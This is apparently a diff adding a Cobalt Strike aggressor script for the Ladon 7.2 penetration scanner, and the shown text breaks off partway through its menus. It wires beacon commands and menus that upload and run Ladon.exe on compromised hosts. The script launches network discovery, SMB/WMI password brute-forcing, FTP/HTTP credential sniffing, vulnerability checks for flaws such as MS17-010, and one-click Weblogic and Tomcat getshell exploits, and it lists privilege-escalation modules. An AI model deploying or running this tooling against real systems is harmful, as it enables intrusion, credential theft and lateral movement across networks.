@@ -1,0 +1,1243 @@
+#Ladon 7.2 for Cobalt Strike
+#author:	k8gege
+#blog:		http://k8gege.org/Ladon
+#github:	https://github.com/k8gege
+#teston:	CS 3.x & 4.0
+#update: 	20211015
+
+#一些模块不支持CS(确却的说是CS是不支持)，若需要请使用EXE全功能版。
+#不支持模块1: [NbtScan VncScan MysqlScan OracleScan SSHscan WinrmScan]  
+#不支持模块2: [SubDomain PsExec WinrmExec DumpLsass RdpHijack cve-2020-0688]
+
+beacon_command_register(
+"Ladon", 
+"Ladon large network penetration scanner", 
+"\nUsing: Ladon help\nLadon is a multi-threaded plug-in comprehensive scanning artifact for large-scale network penetration, including port scanning, service identification, network assets, password explosion, high-risk vulnerability detection and one click getshell. It supports batch a / B / C segment scanning and cross network segment scanning, as well as URL, host and domain name list scanning. Version 7.2 has built-in 94 function modules and 18 external modules. Through a variety of protocols and methods, it can quickly obtain the IP, computer name, working group, shared resources, network card address, operating system version, website, subdomain name, middleware, open service, router, database and other information of the target network");
+
+alias Ladon {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq "help"){
+	blog2($1, "Ladon 7.2");
+	blog2($1, "Usage:");
+	#blog2($1, "Ladon 1");
+	blog2($1, "Ladon ip");
+	blog2($1, "Ladon ip scantype");
+	#blog2($1, "Ladon noping");
+	blog2($1, "Ladon noping ip");
+	blog2($1, "Ladon noping ip scantype");	
+	blog2($1, "ScanType:(Discover/Brute/Encode/Exploit)");
+	blog2($1, "ip: [ip ip/24 ip/26 ip/8]");
+	blog2($1, "Discover: [OnlineIP OnlinePC OSscan CiscoScan]");
+	blog2($1, "Discover: [WebScan WebScan2 SameWeb UrlScan WhatCMS WebDir SubDomain HostIP DomainIP]");
+	blog2($1, "Vulnerable: [MS17010 SmbGhost WeblogicPoc PhpStudyPoc ActiveMQPoc TomcatPoc Struts2Poc]");
+	blog2($1, "Vulnerable: [WeblogicExp TomcatExp]");
+	blog2($1, "Brute-Force: [LdapScan FtpScan WmiScan SmbScan NbtScan LdapScan SmbHashScan WmiHashScan]");
+	blog2($1, "Discover: [EnumMssql EnumShare EnumIIS EnumProcess GetCmdLine GetInfo GetInfo2 GetPipe GetHtml AdiDnsDump]");
+	blog2($1, "Encode: [EnHex DeHex EnBase64 DeBase64]");
+	blog2($1, "Sinffer: [[Sniffer FtpSniffer HttpSniffer HttpDownload FtpDownload]]");
+	blog2($1, "RemoteExec: [AtExec WmiExec SshExec JspShell WebShell]");
+	blog2($1, "GetInfo: [CheckDoor EnableDotNet GetIP GetHtml WebSer]");
+	blog2($1, "Elevate: [MS16135 BypassUAC GetSystem Runas RunPS SweetPotato BadPotato]");
+	blog2($1, "Example: Ladon 192.168.1.8/24 OnlinePC");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ini");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ps1");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.dll(c#)");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.exe(c#)");	
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub LadonStart {
+	blog2($bid,"Ladon ".$3["moudle"]);
+	bcd!($bid, "c:\\windows\\temp");
+	brm!($bid,"Ladon.exe");
+	brm!($bid,"netscan.dll");
+	#bshell!($bid,"del Ladon**.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}	
+	bupload!($bid, script_resource("bin\\Ladon".$3['clrver'].".exe"));
+	bmv!($bid, "Ladon".$3['clrver'].".exe", "Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		bupload!($bid, script_resource("bin\\".$3['moudle']."\\netscan".$3['clrver'].".dll"));
+		bmv!($bid, "netscan".$3['clrver'].".dll", "netscan.dll");
+	}
+
+	bshell!($bid, "Ladon.exe");
+	#bpause($1, 10000);
+	brm!($bid,"Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}
+}
+
+sub LadonScan {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['tar'].' '.$3['moudle']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['tar'].' '.$3['moudle']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub LoadMoudle2 {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle'].' '.$3['tar']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['moudle'].' '.$3['tar']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub GetInfo {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['moudle'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"),$3['moudle']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub Sniffer {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle'].' '.$3['tar']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['moudle'].' '.$3['tar']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub HttpDownload {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle'].' '.$3['tar']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['moudle'].' '.$3['tar']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub ms17010 {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['tar'].' MS17010');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+alias CVE-2019-2725-POC {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicPoc');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+alias CVE-2019-2725-EXP {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicExp');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+popup beacon_bottom {
+menu "巨龙拉冬" {
+item("&Ladon 7.2", { url_open("https://k8gege.org/Ladon?cs"); });
+separator();
+
+menu "网络资产收集" {
+	item "多协议探测存活主机" {
+	#OnlinePC
+	$bid = $1;
+	$dialog = dialog("Ladon OnlinePC", %(tar => "",moudle => "OnlinePC",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "仅ICMP探测存活(快)" {
+	#OnlineIP
+	$bid = $1;
+	$dialog = dialog("Ladon ICMP", %(tar => "",moudle => "ICMP",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Oxid多网卡主机探测" {
+	#OSscan
+	$bid = $1;
+	$dialog = dialog("Ladon EthScan", %(tar => "",moudle => "EthScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","EthScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "多协议操作系统探测" {
+	#OSscan
+	$bid = $1;
+	$dialog = dialog("Ladon OSscan", %(tar => "",moudle => "OSscan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "网站、标题、Banner" {
+	#WebScan
+	$bid = $1;
+	$dialog = dialog("Ladon WebScan", %(tar => "",moudle => "WebScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "智能网站CMS识别" {
+	#WhatCMS
+	$bid = $1;
+	$dialog = dialog("Ladon WhatCMS", %(tar => "",moudle => "WhatCMS",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "常见端口服务探测" {
+	$bid = $1;
+	$dialog = dialog("Ladon PortScan", %(tar => "",moudle => "PortScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Shiro探测" {
+	$bid = $1;
+	$dialog = dialog("Ladon IsShiro", %(tar => "",moudle => "IsShiro",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Cisco探测" {
+	#CiscoScan
+	$bid = $1;
+	$dialog = dialog("Ladon CiscoScan", %(tar => "",moudle => "CiscoScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "LDAP服务器探测" {
+	$bid = $1;
+	$dialog = dialog("Ladon LdapScan", %(tar => "",moudle => "LdapScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "FTP服务器探测" {
+	$bid = $1;
+	$dialog = dialog("Ladon FtpScan", %(tar => "",moudle => "FtpScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+
+	item "枚举MSSQL服务器" {
+	#EnumMssql
+	$bid = $1;
+	$dialog = dialog("Ladon EnumMssql", %(tar => "",moudle => "EnumMssql",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "Enum Lan MSSQL SERVER");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("EnumMssql"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "枚举共享资源" {
+	#EnumShare
+	$bid = $1;
+	$dialog = dialog("Ladon EnumShare", %(tar => "",moudle => "EnumShare",clrver => "35",bid => $bid), &GetInfo);
+	dialog_description($dialog, "Enum Lan share info");
+	#drow_text($dialog, "tar",  "Target:");
+	drow_combobox($dialog, "moudle", "Moudle:", @("EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+}
+
+menu "系统信息探测" {
+	item "SMB探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon SmbInfo", %(tar => "",moudle => "SmbInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "WMI探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon WmiInfo", %(tar => "",moudle => "WmiInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "NBT探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon NbtInfo", %(tar => "",moudle => "NbtInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "RDP探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon RdpInfo", %(tar => "",moudle => "RdpInfo f=1",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "SNMP探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon SnmpScan", %(tar => "",moudle => "SnmpScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	#drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "MSSQL探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon MssqlInfo", %(tar => "",moudle => "MssqlInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "WINRM探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon WinrmInfo", %(tar => "",moudle => "WinrmInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Exchange探测系统信息" {
+	$bid = $1;
+	$dialog = dialog("Ladon ExcahngeInfo", %(tar => "",moudle => "ExcahngeInfo",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+}
+
+menu "远程漏洞检测" {
+	item "SMB永恒之蓝检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon MS17010", %(tar => "",moudle => "MS17010",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "SMB永恒之黑检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon SMBGhost", %(tar => "",moudle => "SMBGhost",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Struts2漏洞检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon Struts2Poc", %(tar => "",moudle => "Struts2Poc",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Weblogic漏洞检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon WeblogicPoc", %(tar => "",moudle => "WeblogicPoc",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "PhpStudy后门检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon PhpStudyPoc", %(tar => "",moudle => "PhpStudyPoc",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	
+	}
+	item "ActiveMQ漏洞检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon ActiveMQPoc", %(tar => "",moudle => "ActiveMQPoc",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Tomcat漏洞检测" {
+	$bid = $1;
+	$dialog = dialog("Ladon TomcatExp", %(tar => "",moudle => "TomcatExp",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+
+}
+
+menu "一键GetShell" {
+	item "Exchange CVE-2020-0688" {
+	#Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520
+	}
+	item "Weblogic GetShell" {
+	$bid = $1;
+	$dialog = dialog("Ladon WeblogicExp", %(tar => "",moudle => "WeblogicExp",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "Tomcat GetShell" {
+	$bid = $1;
+	$dialog = dialog("Ladon TomcatExp", %(tar => "",moudle => "TomcatExp",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+}
+
+menu "网络密码嗅探" {
+	item "FTP密码嗅探" {
+	$bid = $1;
+	$dialog = dialog("Ladon FtpSniffer", %(tar => "",moudle => "FtpSniffer",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+	item "HTTP密码嗅探" {
+	$bid = $1;
+	$dialog = dialog("Ladon HttpSniffer", %(tar => "",moudle => "HttpSniffer",clrver => "35",bid => $bid), &LoadMoudle2);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Start");
+	dialog_show($dialog);
+	}
+}
+
+menu "网络密码审计" {
+	item "445端口SMB密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon SmbScan", %(tar => "",moudle => "SmbScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "135端口WMI密码审计(Windows)" {
+	$bid = $1;
+	$dialog = dialog("Ladon WmiScan", %(tar => "",moudle => "WmiScan",clrver => "35",bid => $bid), &LadonScan);
+	dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+	drow_text($dialog, "tar",  "Target:");
+	#drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
+	#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+	drow_checkbox($dialog, 'type', 'noping');
+	dbutton_action($dialog, "Scan");
+	dialog_show($dialog);
+	}
+	item "445端口SMB-HASH密码审计(Windows)" {
+	$bid = $1;
